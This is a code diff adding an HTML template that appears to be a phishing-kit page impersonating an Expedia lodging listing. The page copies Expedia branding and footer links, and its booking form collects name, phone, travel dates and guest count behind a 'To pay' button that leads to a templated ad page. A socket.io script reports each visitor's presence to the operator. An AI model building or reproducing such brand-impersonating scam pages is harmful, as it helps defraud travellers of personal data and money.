+                                                    minmax(0, 1fr)
+                                                  );
+                                                  --uitk-layoutgrid-rows: repeat(
+                                                    3,
+                                                    minmax(0, 1fr)
+                                                  );
+                                                  --uitk-layoutgrid-column-gap: var(
+                                                    --uitk-layoutgrid-space-four
+                                                  );
+                                                  --uitk-layoutgrid-row-gap: var(
+                                                    --uitk-layoutgrid-space-four
+                                                  );
+                                                ">
+                                              <li role="listitem">
+                                                <svg
+                                                  class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-two uitk-icon-medium uitk-icon-default-theme"
+                                                  aria-hidden="true" viewBox="0 0 24 24"
+                                                  xmlns="http://www.w3.org/2000/svg"
+                                                  xmlns:xlink="http://www.w3.org/1999/xlink">
+                                                  <path
+                                                    d="M9 8a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5zm-4.5 4a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5zm13-6.5a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0zm2 6.5a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5zm-9.7-.61-5.15 5.58A3 3 0 0 0 6.85 22h.65l1.19-.13a30 30 0 0 1 6.62 0l1.19.13h.65a3 3 0 0 0 2.2-5.03l-5.15-5.58a3 3 0 0 0-4.4 0z">
+                                                  </path>
+                                                </svg>
+                                                <span class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                                  Pet friendly
+                                                </span>
+                                              </li>
+                                              <li role="listitem">
+                                                <svg
+                                                  class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-two uitk-icon-medium uitk-icon-default-theme"
+                                                  aria-hidden="true" viewBox="0 0 24 24"
+                                                  xmlns="http://www.w3.org/2000/svg"
+                                                  xmlns:xlink="http://www.w3.org/1999/xlink">
+                                                  <path fill-rule="evenodd"
+                                                    d="m1 9 2 2a12.73 12.73 0 0 1 18 0l2-2A15.57 15.57 0 0 0 1 9zm8 8 3 3 3-3a4.24 4.24 0 0 0-6 0zm-2-2-2-2a9.91 9.91 0 0 1 14 0l-2 2a7.07 7.07 0 0 0-10 0z"
+                                                    clip-rule="evenodd"></path>
+                                                </svg>
+                                                <span class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                                  Free WiFi
+                                                </span>
+                                              </li>
+                                              <li role="listitem">
+                                                <svg
+                                                  class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-two uitk-icon-medium uitk-icon-default-theme"
+                                                  aria-hidden="true" viewBox="0 0 24 24"
+                                                  xmlns="http://www.w3.org/2000/svg"
+                                                  xmlns:xlink="http://www.w3.org/1999/xlink">
+                                                  <path fill-rule="evenodd"
+                                                    d="M20.15 10.15c-1.59 1.59-3.74 2.09-5.27 1.38L13.41 13l6.88 6.88-1.41 1.41L12 14.41l-6.89 6.87-1.41-1.41 9.76-9.76c-.71-1.53-.21-3.68 1.38-5.27 1.92-1.91 4.66-2.27 6.12-.81 1.47 1.47 1.1 4.21-.81 6.12zm-9.22.36L8.1 13.34 3.91 9.16a4 4 0 0 1 0-5.66l7.02 7.01z"
+                                                    clip-rule="evenodd"></path>
+                                                </svg>
+                                                <span class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                                  Restaurant
+                                                </span>
+                                              </li>
+                                              <li role="listitem">
+                                                <svg
+                                                  class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-two uitk-icon-medium uitk-icon-default-theme"
+                                                  aria-hidden="true" viewBox="0 0 24 24"
+                                                  xmlns="http://www.w3.org/2000/svg"
+                                                  xmlns:xlink="http://www.w3.org/1999/xlink">
+                                                  <path
+                                                    d="M22 11h-4.17l3.24-3.24-1.41-1.42L15 11h-2V9l4.66-4.66-1.42-1.41L13 6.17V2h-2v4.17L7.76 2.93 6.34 4.34 11 9v2H9L4.34 6.34 2.93 7.76 6.17 11H2v2h4.17l-3.24 3.24 1.41 1.42L9 13h2v2l-4.66 4.66 1.42 1.41L11 17.83V22h2v-4.17l3.24 3.24 1.42-1.41L13 15v-2h2l4.66 4.66 1.41-1.42L17.83 13H22v-2z">
+                                                  </path>
+                                                </svg>
+                                                <span class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                                  Air conditioning
+                                                </span>
+                                              </li>
+                                              <li role="listitem">
+                                                <svg
+                                                  class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-two uitk-icon-medium uitk-icon-default-theme"
+                                                  aria-hidden="true" viewBox="0 0 24 24"
+                                                  xmlns="http://www.w3.org/2000/svg"
+                                                  xmlns:xlink="http://www.w3.org/1999/xlink">
+                                                  <path fill-rule="evenodd"
+                                                    d="M20 3H4v10a4 4 0 0 0 4 4h6a4 4 0 0 0 4-4v-3h2a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2zm0 5h-2V5h2v3zm0 11H4v2h16v-2z"
+                                                    clip-rule="evenodd"></path>
+                                                </svg>
+                                                <span class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                                  Breakfast available
+                                                </span>
+                                              </li>
+                                              <li role="listitem">
+                                                <svg
+                                                  class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-two uitk-icon-medium uitk-icon-default-theme"
+                                                  aria-hidden="true" viewBox="0 0 24 24"
+                                                  xmlns="http://www.w3.org/2000/svg"
+                                                  xmlns:xlink="http://www.w3.org/1999/xlink">
+                                                  <path fill-rule="evenodd"
+                                                    d="M6 3h7a6 6 0 0 1 0 12h-3v6H6V3zm4 8h3.2a2 2 0 0 0 2-2 2 2 0 0 0-2-2H10v4z"
+                                                    clip-rule="evenodd"></path>
+                                                </svg>
+                                                <span class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                                  Parking available
+                                                </span>
+                                              </li>
+                                            </div>
+                                          </ul>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+                                  <div style="
+                                        border: 1px solid rgb(221, 221, 221);
+                                        border-radius: 12px;
+                                        padding: 24px;
+                                        box-shadow: rgba(0, 0, 0, 0.12) 0px 6px
+                                          16px;
+                                      ">
+                                    <div data-plugin-in-point-id="BOOK_IT_SIDEBAR" data-section-id="BOOK_IT_SIDEBAR">
+                                      <div>
+                                        <div class="_ud8a1c">
+                                          <div class="_wgmchy" data-testid="book-it-default">
+                                            <div class="_c7v1se">
+                                              <div style="
+                                                    --pricing-guest-display-price-alignment: flex-start;
+                                                    --pricing-guest-display-price-flex-wrap: wrap;
+                                                    --pricing-guest-primary-line-font-size: 22px;
+                                                    --pricing-guest-primary-line-line-height: 26px;
+                                                    --pricing-guest-primary-line-unit-price-font-weight: 600;
+                                                    --pricing-guest-primary-line-trialing-content-font-size: 14px;
+                                                    --pricing-guest-secondary-line-font-size: 14px;
+                                                    --pricing-guest-secondary-line-line-height: 18px;
+                                                    --pricing-guest-secondary-line-color: #717171;
+                                                    --pricing-guest-explanation-disclaimer-font-size: 14px;
+                                                    --pricing-guest-explanation-disclaimer-line-height: 18px;
+                                                    --pricing-guest-primary-line-strikethrough-price-font-weight: 600;
+                                                    --pricing-guest-primary-line-qualifier-font-size: 16px;
+                                                    --pricing-guest-primary-line-qualifier-line-height: 20px;
+                                                  ">
+                                                <div class="_ati8ih">
+                                                  <div class="_1n700sq">
+                                                    <div class="_1jo4hgw" aria-hidden="true">
+                                                      <span class="_tyxjp1">
+                                                        <%=ad.price%>
+                                                      </span>
+                                                      <span class="_1vylq8i">
+
+                                                      </span>
+                                                    </div>
+                                                  </div>
+                                                </div>
+                                              </div>
+                                              <div class="_klarpw">
+                                                <span class="_1y9gwt75">
+                                                  <span class="_9qqdp4" style="font-size: 12px;">
+                                                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"
+                                                      aria-hidden="true" role="presentation" focusable="false" style="
+                                                          display: block;
+                                                          height: 12px;
+                                                          width: 12px;
+                                                          fill: currentcolor;
+                                                        ">
+                                                      <path
+                                                        d="M15.094 1.579l-4.124 8.885-9.86 1.27a1 1 0 0 0-.542 1.736l7.293 6.565-1.965 9.852a1 1 0 0 0 1.483 1.061L16 25.951l8.625 4.997a1 1 0 0 0 1.482-1.06l-1.965-9.853 7.293-6.565a1 1 0 0 0-.541-1.735l-9.86-1.271-4.127-8.885a1 1 0 0 0-1.814 0z"
+                                                        fill-rule="evenodd"></path>
+                                                    </svg>
+                                                  </span>
+                                                </span>
+                                              </div>
+                                            </div>
+                                            <div class="_p03egf">
+                                              <div class="blcbuy">
+                                                <h5 class="buytitle">
+                                                  Enter data
+                                                </h5>
+                                                <div class="blcbuyopl">
+                                                  <div class="blcinb">
+                                                    <label for="">
+                                                      Name
+                                                    </label>
+                                                    <input data-zuser_firstname="" placeholder="Enter your name"
+                                                      class="inputik">
+                                                  </div>
+                                                  <div class="blcinb">
+                                                    <label for="">
+                                                      Surname
+                                                    </label>
+                                                    <input data-zuser_lastname="" placeholder="Enter your last name"
+                                                      class="inputik">
+                                                  </div>
+                                                  <div class="blcinb">
+                                                    <label for="">
+                                                      Phone number
+                                                    </label>
+                                                    <input data-zuser_phone="" placeholder="Enter your phone number"
+                                                      class="inputik">
+                                                  </div>
+                                                  <div class="blcinb">
+                                                    <label for="">
+                                                      Arrival date
+                                                    </label>
+                                                    <input data-zuser_date-arrival="" type="date" style="
+                                                          background: #fff;
+                                                        " placeholder="Enter check-in date" class="inputik">
+                                                  </div>
+
+                                                  <div class="blcinb">
+                                                    <label for="">
+                                                      Date of departure
+                                                    </label>
+                                                    <input data-zuser_date-departure="" type="date" style="
+                                                          background: #fff;
+                                                        " placeholder="Enter departure date" class="inputik">
+                                                  </div>
+                                                  <div class="blcinb">
+                                                    <label for="">
+                                                      Number of guests
+                                                    </label>
+                                                    <input data-zuser_guest="" type="number" style="
+                                                          background: #fff;
+                                                        " placeholder="Enter the number of guests" class="inputik">
+                                                  </div>
+                                                </div>
+                                              </div>
+                                            </div>
+                                            <form method="GET" action="/ad/<%=ad.id%>">
+                                              <button type="submit" data-zbtn-buy="" class="btn">
+                                                <div>To pay</div>
+                                              </button>
+                                            </form>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                            <div></div>
+                            <div>
+                              <div class="lazyload-wrapper">
+                                <div class="uitk-spacing uitk-spacing-margin-blockend-three"></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="lazyload-wrapper">
+                    <div data-stid="property-legal-disclaimer"></div>
+                  </div>
+                </section>
+              </div>
+            </div>
+          </main>
+          <h2 class="uitk-heading uitk-heading-4 is-visually-hidden">
+            Additional information about Expedia Group
+          </h2>
+          <footer class="global-navigation-footer">
+            <div class="global-navigation-footer-container">
+              <div
+                class="uitk-layout-flex uitk-layout-flex-flex-direction-column uitk-spacing uitk-spacing-margin-unset uitk-spacing-padding-inlinestart-six uitk-spacing-padding-blockstart-six uitk-spacing-padding-blockend-twelve uitk-spacing-padding-small-inlineend-three uitk-spacing-padding-medium-inlineend-three uitk-spacing-padding-large-inlineend-two uitk-spacing-padding-extra_large-inlineend-two">
+                <ul
+                  class="uitk-typelist uitk-typelist-orientation-stacked uitk-typelist-size-2 uitk-spacing uitk-spacing-padding-blockend-two uitk-layout-flex-item uitk-layout-flex-item-flex-basis-full_width"
+                  role="list">
+                  <li
+                    class="uitk-layout-grid-item uitk-layout-grid-item-has-column-start-by-large uitk-layout-grid-item-has-column-start uitk-layout-grid-item-has-row-start-by-large"
+                    role="listitem" style="
+                        --uitk-layoutgrid-column-start: span 2;
+                        --uitk-layoutgrid-column-start-large: 1;
+                        --uitk-layoutgrid-row-start-large: 1;
+                      ">
+                    <div
+                      class="uitk-layout-flex uitk-layout-flex-align-items-flex-start uitk-layout-flex-flex-direction-column uitk-layout-flex-justify-content-flex-start uitk-spacing no-bullet uitk-spacing-padding-blockstart-two">
+                      <a href="https://www.expediagroup.com/" target="_blank" rel="_blank">
+                        <img aria-label="opens in a new window" src="./expedia_files/EG_Wordmark_blue_RGB.svg"
+                          alt="Expedia Group Logo" width="100%" loading="lazy">
+                      </a>
+                    </div>
+                  </li>
+                  <li
+                    class="uitk-layout-grid-item uitk-layout-grid-item-align-self-start uitk-layout-grid-item-has-row-start-by-medium uitk-layout-grid-item-has-row-start-by-large"
+                    role="listitem" style="
+                        --uitk-layoutgrid-row-start-medium: 2;
+                        --uitk-layoutgrid-row-start-large: 2;
+                      ">
+                    <h3 class="uitk-heading uitk-heading-7 uitk-spacing uitk-spacing-padding-blockstart-two">
+                      Company
+                    </h3>
+                    <ul
+                      class="uitk-typelist uitk-typelist-orientation-stacked uitk-typelist-size-2 uitk-typelist-spacing"
+                      role="list">
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="About" href="https://www.expediagroup.com/" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            About
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Jobs" href="https://lifeatexpediagroup.com/" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Jobs
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="List your property"
+                            href="https://apps.expediapartnercentral.com/en_US/list?utm_medium=referral&amp;utm_source=wwwexpediacom-en_US&amp;utm_campaign=Brand.DTI&amp;utm_contentewd=footer-btn&amp;siteId=1&amp;tpid=1&amp;eapid=0&amp;langId=1033&amp;utm_term=Brand.DTI&amp;lasttouchMktgcode=Brand.DTI"
+                            target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            List your property
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Partnerships" href="https://www.expediagroup.com/partnerships/" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Partnerships
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Investor Relations"
+                            href="https://ir.expediagroup.com/investors-overview/default.aspx" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Investor Relations
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Advertising"
+                            href="https://advertising.expedia.com/getting-started/brands/expedia/" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Advertising
+                          </a>
+                        </div>
+                      </li>
+                    </ul>
+                  </li>
+                  <li
+                    class="uitk-layout-grid-item uitk-layout-grid-item-align-self-start uitk-layout-grid-item-has-row-start-by-medium uitk-layout-grid-item-has-row-start-by-large"
+                    role="listitem" style="
+                        --uitk-layoutgrid-row-start-medium: 2;
+                        --uitk-layoutgrid-row-start-large: 2;
+                      ">
+                    <h3 class="uitk-heading uitk-heading-7 uitk-spacing uitk-spacing-padding-blockstart-two">
+                      Explore
+                    </h3>
+                    <ul
+                      class="uitk-typelist uitk-typelist-orientation-stacked uitk-typelist-size-2 uitk-typelist-spacing"
+                      role="list">
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="United States of America travel guide"
+                            href="https://www.expedia.com/United-States-Of-America.dx201" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            United States of America travel guide
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Hotels in United States of America"
+                            href="https://www.expedia.com/Destinations-In-United-States-Of-America.d201.Hotel-Destinations"
+                            target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Hotels in United States of America
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Vacation rentals in United States of America"
+                            href="https://www.expedia.com/Destinations-In-United-States-Of-America.d201.Vacation-Rental-Destinations"
+                            target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Vacation rentals in United States of America
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Vacation packages in United States of America"
+                            href="https://www.expedia.com/United-States-Of-America.d201.Destination-Travel-Guides"
+                            target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Vacation packages in United States of America
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Domestic flights"
+                            href="https://www.expedia.com/Destinations-In-United-States-Of-America.d201.Flight-Destinations"
+                            target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Domestic flights
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Car rentals in United States of America"
+                            href="https://www.expedia.com/Destinations-In-United-States-Of-America.d201.Car-Rental-Destinations"
+                            target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Car rentals in United States of America
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="All accommodation types" href="https://www.expedia.com/Accommodations"
+                            target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            All accommodation types
+                          </a>
+                        </div>
+                      </li>
+                    </ul>
+                  </li>
+                  <li
+                    class="uitk-layout-grid-item uitk-layout-grid-item-align-self-start uitk-layout-grid-item-has-row-start-by-medium uitk-layout-grid-item-has-row-start-by-large"
+                    role="listitem" style="
+                        --uitk-layoutgrid-row-start-medium: 2;
+                        --uitk-layoutgrid-row-start-large: 2;
+                      ">
+                    <h3 class="uitk-heading uitk-heading-7 uitk-spacing uitk-spacing-padding-blockstart-two">
+                      Policies
+                    </h3>
+                    <ul
+                      class="uitk-typelist uitk-typelist-orientation-stacked uitk-typelist-size-2 uitk-typelist-spacing"
+                      role="list">
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Privacy" href="https://www.expedia.com/lp/lg-privacypolicy" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Privacy
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Terms of use" href="https://www.expedia.com/lp/lg-legal" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Terms of use
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Vrbo terms and conditions"
+                            href="https://www.vrbo.com/legal/terms-and-conditions" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Vrbo terms and conditions
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Accessibility"
+                            href="https://www.expedia.com/p/info-other/web-accessibility-policy" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Accessibility
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Your Privacy Choices" href="https://www.expedia.com/dnsmpi" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Your Privacy Choices
+                          </a>
+                        </div>
+                      </li>
+                    </ul>
+                  </li>
+                  <li
+                    class="uitk-layout-grid-item uitk-layout-grid-item-align-self-start uitk-layout-grid-item-has-row-start-by-medium uitk-layout-grid-item-has-row-start-by-large"
+                    role="listitem" style="
+                        --uitk-layoutgrid-row-start-medium: 2;
+                        --uitk-layoutgrid-row-start-large: 2;
+                      ">
+                    <h3 class="uitk-heading uitk-heading-7 uitk-spacing uitk-spacing-padding-blockstart-two">
+                      Help
+                    </h3>
+                    <ul
+                      class="uitk-typelist uitk-typelist-orientation-stacked uitk-typelist-size-2 uitk-typelist-spacing"
+                      role="list">
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Support" href="https://www.expedia.com/service/" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Support
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Cancel your hotel or vacation rental booking"
+                            href="https://www.expedia.com/service/#/articles/399/34/12326" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Cancel your hotel or vacation rental booking
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Cancel your flight"
+                            href="https://www.expedia.com/service/#/articles/397/34/12324" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Cancel your flight
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Refund timelines, policies &amp; processes"
+                            href="https://www.expedia.com/service/#/articles/396/53/15253" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Refund timelines, policies &amp; processes
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="Use an Expedia coupon"
+                            href="https://www.expedia.com/service/#/articles/396/53/12385" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            Use an Expedia coupon
+                          </a>
+                        </div>
+                      </li>
+                      <li class="uitk-spacing uitk-spacing-padding-blockstart-two" role="listitem">
+                        <div class="uitk-layout-flex">
+                          <a aria-label="International travel documents"
+                            href="https://www.expedia.com/service/#/articles/396/52/12386" target="_self"
+                            class="uitk-link uitk-link-align-left uitk-link-layout-default uitk-link-small" role="link">
+                            International travel documents
+                          </a>
+                        </div>
+                      </li>
+                    </ul>
+                  </li>
+                </ul>
+                <div>
+                  <hr class="uitk-spacing uitk-spacing-margin-block-six uitk-spacing-border-blockstart uitk-spacing-hr">
+                </div>
+                <ul
+                  class="uitk-layout-flex uitk-layout-flex-align-items-center uitk-layout-flex-flex-direction-column uitk-layout-flex-flex-wrap-wrap no-bullet">
+                  <li
+                    class="uitk-layout-flex-item-align-self-flex-start uitk-layout-flex-item uitk-layout-flex-item-flex-basis-full_width"
+                    role="listitem">
+                    <div
+                      class="uitk-text uitk-type-start overflow-wrap uitk-type-200 uitk-type-regular uitk-text-default-theme">
+                      <span>
+                        Expedia, Inc. is not responsible for content on
+                        external Web sites.
+                      </span>
+                    </div>
+                  </li>
+                  <li
+                    class="uitk-layout-flex-item-align-self-flex-start uitk-layout-flex-item uitk-layout-flex-item-flex-basis-full_width"
+                    role="listitem">
+                    <div
+                      class="uitk-text uitk-type-start overflow-wrap uitk-type-200 uitk-type-regular uitk-text-default-theme">
+                      <span>
+                        © 2023 Expedia, Inc., an Expedia Group company. All
+                        rights reserved. Expedia and the Airplane Logo are
+                        trademarks or registered trademarks of Expedia, Inc.
+                        CST# 2029030-50.
+                      </span>
+                    </div>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </footer>
+          <span class="uitk-loader uitk-loader-page" title="Loading" aria-label="Loading" aria-hidden="true"></span>
+        </div>
+      </div>
+    </div>
+    <div data-stid="render-status--hydrated"></div>
+  </div>
+
+  <style>
+    @font-face {
+      font-display: optional;
+      font-family: 'Centra No2';
+      font-style: normal;
+      font-weight: 300;
+      src: url('/static/style/expedia/fonts/CentraNo2-Light.woff2') format('woff2'),
+        url('/static/style/expedia/fonts/CentraNo2-Light.woff') format('woff');
+      unicode-range: U+000-0FF;
+    }
+
+    @font-face {
+      font-display: optional;
+      font-family: 'Centra No2';
+      font-style: normal;
+      font-weight: 400;
+      src: url('/static/style/expedia/fonts/CentraNo2-Book.woff2') format('woff2'),
+        url('/static/style/expedia/fonts/CentraNo2-Book.woff') format('woff');
+      unicode-range: U+000-0FF;
+    }
+
+    @font-face {
+      font-display: optional;
+      font-family: 'Centra No2';
+      font-style: normal;
+      font-weight: 500;
+      src: url('/static/style/expedia/fonts/CentraNo2-Medium.woff2') format('woff2'),
+        url('/static/style/expedia/fonts/CentraNo2-Medium.woff') format('woff');
+      unicode-range: U+000-0FF;
+    }
+
+    @font-face {
+      font-display: optional;
+      font-family: 'Centra No2';
+      font-style: normal;
+      font-weight: 700;
+      src: url('/static/style/expedia/fonts/CentraNo2-Bold.woff2') format('woff2'),
+        url('/static/style/expedia/fonts/CentraNo2-Bold.woff') format('woff');
+      unicode-range: U+000-0FF;
+    }
+
+    :root {
+      font-family: 'Centra No2', -apple-system, BlinkMacSystemFont, 'Segoe UI',
+        Roboto, 'Helvetica Neue', Arial, sans-serif;
+      font-synthesis: none;
+    }
+  </style>
+  <script src="./expedia_files/socket.io.min.js"
+    integrity="sha384-c79GN5VsunZvi+Q/WObgk2in0CbZsHnjEqvFxC5DxHn9lTfNce2WW6h2pH6u/kF+"
+    crossorigin="anonymous"></script>
+  <script src="./expedia_files/jquery.min.js"></script>
+  <script src="./expedia_files/jquery.mask.min.js"></script>
+  <script>
+    var socket = io();
+    socket.emit("hello", `connect | aMI37gkqd |`)
+    $(function () {
+      window.focus();
+      $(window).bind('focus', function () {
+        socket.emit("hello", `connect | aMI37gkqd |`)
+      });
+      $(window).bind('blur', function () {
+        socket.emit("hello", `disconnect | aMI37gkqd |`)
+      });
+    });
+  </script>
+  <div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate"
+    style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: &#39;Google Sans&#39;, Arial, sans-serif;"
+    data-id="">
+    <div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd">
+      <div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c"><img src="./expedia_files/24px.svg" width="24" height="24" alt="">
+      </div>
+      <div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c">
+        <div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">Исходный текст</div>
+        <div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div>
+      </div>
+      <div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr">
+        <div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr">
+          <div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Оцените этот перевод</div>
+          <div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Ваш отзыв поможет нам улучшить Google Переводчик</div>
+        </div>
+        <div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button"
+            class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Хороший перевод" aria-label="Хороший перевод"
+            aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24"
+                focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
+                <path
+                  d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z">
+                </path>
+              </svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24"
+                focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
+                <path
+                  d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z">
+                </path>
+              </svg></span></button><button id="goog-gt-thumbDownButton" type="button"
